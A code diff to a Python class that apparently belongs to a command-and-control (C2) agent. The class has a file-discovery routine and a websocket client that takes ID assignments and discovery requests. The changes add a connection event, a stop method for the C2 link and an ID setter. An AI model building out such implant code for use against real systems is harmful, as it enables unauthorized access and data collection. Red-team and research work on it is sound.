@@ -13,6 +13,7 @@ class Program():
         self.__found_files = []
         self.__should_cli_run = True
         self.__id = ""
+        self.connected = asyncio.Event()
         self.__client: WebsocketClient = None
         if data is not None:
             self.__found_files = data.get("found_files", [])
@@ -28,6 +29,17 @@ class Program():
                 await self.__cli()
             case "c2":
                 await self.__c2_mode()
+
+    async def stop(self):
+        match self.__mode__:
+            case "c2":
+                print("Stopping C2 connection...")
+                if self.__client is not None:
+                    await self.__client.stop()
+            case "auto":
+                pass
+            case "manual":
+                self.__should_cli_run = False
 
     def __help(self):
         print("Available commands:")
@@ -83,6 +95,9 @@ class Program():
                     await self.__cli()
 
         self.__mode__ = new_mode
+
+    def set_id(self, id: str):
+        self.__id = id
     
     def __envcheck(self):
         import platform
@@ -127,7 +142,6 @@ class Program():
             for f in files:
                 self.__found_files.append(os.path.join(root, f))
 
-        #TODO: add mode to discovered_info.json
         with open("discovered_info.json", "w") as output_file:
             json.dump({
                 "found_files": self.__found_files,
@@ -318,8 +332,9 @@ class Program():
         message_reply = {}
         match message.get("type"):
             case "set_id":
-                self.__id = message.get("data", {}).get("id", "")
+                self.set_id(message.get("data", {}).get("id", ""))
                 print("ID SET", self.__id)
+                self.connected.set()
                 return None
             
             case "discovery_req":
